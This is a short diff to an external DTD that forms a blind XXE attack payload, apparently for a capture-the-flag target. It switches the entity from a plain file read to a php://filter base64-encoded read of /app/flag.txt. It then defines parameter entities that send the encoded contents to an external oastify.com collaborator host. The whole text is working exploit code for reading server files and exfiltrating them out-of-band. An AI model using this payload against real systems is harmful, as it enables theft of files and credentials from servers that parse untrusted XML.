@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///app/flag.txt">
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/app/flag.txt">
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://i2l71d68arsph0bgiatvac7g2784wzko.oastify.com/?x=%file;'>">
 %eval;
 %exfil;
